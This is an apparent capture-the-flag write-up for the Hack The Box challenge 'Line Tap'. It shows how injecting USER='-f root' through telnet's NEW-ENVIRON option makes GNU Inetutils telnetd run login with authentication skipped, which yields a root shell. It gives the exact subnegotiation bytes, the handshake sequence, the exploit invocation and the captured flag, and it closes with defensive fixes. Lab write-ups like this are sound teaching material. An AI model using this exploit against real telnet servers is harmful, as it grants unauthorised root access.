# Line Tap: Writeup

**Category:** ICS / Network
**Flag:** `HTB{r7u_l1n3_74p_5n4p5h07_f71b666aa7b5e2f977e45fd908002eef}`

## TL;DR

Target runs GNU Inetutils `telnetd` vulnerable to the classic **NEW-ENVIRON `USER` argument injection** (login auth bypass). Injecting `USER=-f root` via the telnet NEW-ENVIRON option makes `telnetd` pass `-f root` into the `login` command line, and `login -f root` skips authentication → instant root shell.

```
uid=0(root) gid=0(root) groups=0(root)
```

## Recon

- Service: telnet on `154.57.164.68:30566`.
- Banner slow (~9-11s): heavy latency / per-connection throttle at the perimeter.
- Server negotiates: `DO TTYPE / TSPEED / XDISPLOC / NEWENV / OLDENV`. Presence of **NEW-ENVIRON (opt 39)** is the tell: it lets the client push environment variables to the server, and telnetd forwards `USER` to `login`.

## The vulnerability

BSD/GNU telnetd builds the login invocation as roughly:

```
login -h <remotehost> -- <USER>
```

In the **vulnerable** build the value of the client-supplied `USER` environment variable is placed on the `login` command line *without* being safely separated from options. If `USER` begins with `-`, `login` parses it as flags. `login`'s `-f` means **"user is preauthenticated, skip password"**. So `USER` = an argument string that yields `-f root` gives passwordless root.

## Dead ends (and why)

The critical detail was the **exact form of the injected value**:

| Injected `USER` | Result | Why |
|---|---|---|
| *(none, vanilla)* | `login:` prompt after ~10s | Normal path: proves channel works |
| `-froot` | connection closed instantly, no login | `login` getopt reads `-froot` as bundled `-f -r -o -o -t`; unknown opts → error → exit → telnetd closes |
| `-f root` | **root shell** | The space splits it: `-f` (skip auth) + operand `root` (the user) |

Second dead end: the **first working exploit script was reactive**: it only answered the server's `DO`/`WILL` requests. That was not enough to make `telnetd` fork `login`, so it looked "blind" (zero bytes back). The fix was a **proactive maximal client handshake** sent on connect:

```
IAC WILL TTYPE, IAC WILL NAWS, IAC WILL NEWENV, IAC WILL TSPEED,
IAC DO SGA,  IAC DO ECHO,  + NAWS subneg (80x24)
```

Once the full handshake was sent, the server replied `WILL ECHO` / `WILL SGA` (login PTY spawned) and text flowed.

## Exploit

`manual.py`: a hand-driven telnet client that does the full handshake, answers `TTYPE`/`TSPEED`/`NAWS`, and replies to the `NEW-ENVIRON SEND` with an injected `USER`, then bridges keyboard ↔ socket so the session is interactive.

Winning run:

```
python3 line_tap/manual.py -- "-f root"
```

Reply sent for `NEW-ENVIRON`:

```
IAC SB NEWENV IS VAR "USER" VALUE "-f root" IAC SE
```

Server returns the Ubuntu MOTD and drops straight to `root@...:~#`. Then:

```
id; cat /flag* /root/flag*
uid=0(root) gid=0(root) groups=0(root)
HTB{r7u_l1n3_74p_5n4p5h07_f71b666aa7b5e2f977e45fd908002eef}
```

## Key telnet mechanics

- **NEW-ENVIRON (opt 39)** subnegotiation carries env vars. Reply format:
  `IAC SB 39 IS 0(VAR) "USER" 1(VALUE) "<payload>" IAC SE`
- Must complete a real-looking handshake (TTYPE=xterm, TSPEED, NAWS) or `telnetd` never forks `login`.
- `login -f <user>` = preauthenticated login, no password. Injecting it as an argument is the whole bug.

## Fix (defensive)

- Patch to a telnetd that inserts `--` before the username / sanitizes env-derived args, or drops `USER` values starting with `-`.
- Better: don't run telnet. Use SSH.
